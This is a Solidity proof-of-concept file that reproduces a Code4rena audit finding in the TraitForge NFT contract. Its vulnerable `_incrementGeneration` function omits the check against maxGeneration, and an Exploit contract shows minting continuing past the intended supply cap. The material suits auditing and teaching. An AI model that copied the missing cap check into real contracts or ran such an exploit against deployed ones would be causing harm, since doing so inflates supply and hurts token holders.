// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    TraitForge — The maximum number of generations is infinite
    (inzinko, Code4rena 2024-07-traitforge, finding #37919, [H-05])

    SYNTHETIC, CHEATCODE-FREE reproduction for the EVM Playground. The
    vulnerable TraitForgeNft._incrementGeneration is inlined VERBATIM (it
    increments currentGeneration with NO check against maxGeneration). The
    Exploit mints exactly enough tokens to legitimately fill every generation
    up to the intended cap, then shows the very next mint pushes
    currentGeneration PAST the cap and keeps minting indefinitely (no fork,
    no cheatcodes).

    Scale note: the real protocol caps at maxGeneration=10 with
    maxTokensPerGen=10_000 (intended max supply 100_000, per the finding's
    own PoC). This reduction uses maxGeneration=3, maxTokensPerGen=2
    (intended max supply 6) purely to keep the PoC's mint loop cheap and
    fast to record/replay in-browser — the vulnerable increment logic and
    the missing-cap-check root cause are identical at any scale.
//////////////////////////////////////////////////////////////////////////*/

/*//////////////////////////////////////////////////////////////
    Root cause: `_incrementGeneration` re-checks that the CURRENT
    generation's mint count reached its per-generation cap, then
    unconditionally does `currentGeneration++` — there is no check that the
    NEW `currentGeneration` does not exceed `maxGeneration`. So once the
    last intended generation fills up, the very next mint silently opens
    a brand-new, uncapped generation, and the process repeats forever:
    the protocol's advertised fixed maximum supply (maxGeneration x
    maxTokensPerGen) is not actually enforced anywhere.
//////////////////////////////////////////////////////////////*/

/// @notice Reduced TraitForgeNft. Tracks generations and per-generation mint
///         counts; a mint that fills the current generation rolls over into
///         the next one via `_incrementGeneration` — which is missing the
///         cap check against `maxGeneration`.
contract TraitForgeNft {
    uint256 public currentGeneration = 1;
    uint256 public maxGeneration = 3; // intended hard cap (real protocol: 10)
    uint256 public maxTokensPerGen = 2; // per-generation mint cap (real protocol: 10_000)

    mapping(uint256 => uint256) public generationMintCounts;
    mapping(uint256 => address) public ownerOfToken;
    uint256 public totalMinted;

    event GenerationIncremented(uint256 newGeneration);

    /// @notice Mint a token into the current generation; rolls the
    ///         generation over once the per-generation cap is reached.
    function mintToken() external {
        totalMinted++;
        uint256 tokenId = totalMinted;
        ownerOfToken[tokenId] = msg.sender;

        generationMintCounts[currentGeneration]++;

        if (generationMintCounts[currentGeneration] >= maxTokensPerGen) {
            _incrementGeneration();
        }
    }

    function getGeneration() external view returns (uint256) {
        return currentGeneration;
    }

    function _incrementGeneration() private {
        require(
            generationMintCounts[currentGeneration] >= maxTokensPerGen,
            'Generation limit not yet reached'
        );
        currentGeneration++; // @> VULN: no check that currentGeneration <= maxGeneration
        // FIX: require(currentGeneration <= maxGeneration, 'Maximum generation reached');
        generationMintCounts[currentGeneration] = 0;
        emit GenerationIncremented(currentGeneration);
    }
}

contract Exploit {
    TraitForgeNft public nft; // CREATE nonce 1

    constructor() {
        nft = new TraitForgeNft(); // nonce 1
    }

    /// @notice Mints exactly enough tokens to legitimately fill every
    ///         generation up to the intended cap (maxGeneration), then
    ///         proves the very next mint pushes currentGeneration PAST the
    ///         cap and keeps accepting mints — an unbounded supply.
    function run() external {
        uint256 maxGen = nft.maxGeneration();
        uint256 perGen = nft.maxTokensPerGen();
        uint256 intendedMaxSupply = maxGen * perGen; // e.g. 3 * 2 = 6

        // Legitimate usage: mint exactly the intended max supply, filling
        // generations 1..maxGen. The LAST of these mints already triggers
        // _incrementGeneration one time too many (no cap check), pushing
        // currentGeneration to maxGen + 1.
        for (uint256 i = 0; i < intendedMaxSupply; i++) {
            nft.mintToken();
        }

        uint256 genAfterFill = nft.getGeneration();
        require(genAfterFill == maxGen + 1, "cap not breached as expected");

        uint256 mintedAtCap = nft.totalMinted();
        require(mintedAtCap == intendedMaxSupply, "unexpected supply at cap");

        // HARM: mint an entire extra generation's worth of tokens that
        // should never have been mintable — the protocol's advertised
        // fixed maximum supply is not enforced.
        for (uint256 i = 0; i < perGen; i++) {
            nft.mintToken();
        }

        uint256 finalSupply = nft.totalMinted();
        uint256 finalGeneration = nft.getGeneration();

        require(finalGeneration > maxGen, "generation not beyond intended cap");
        require(finalSupply > intendedMaxSupply, "no tokens minted beyond intended cap");
        require(finalSupply == intendedMaxSupply + perGen, "unexpected final supply");
    }
}
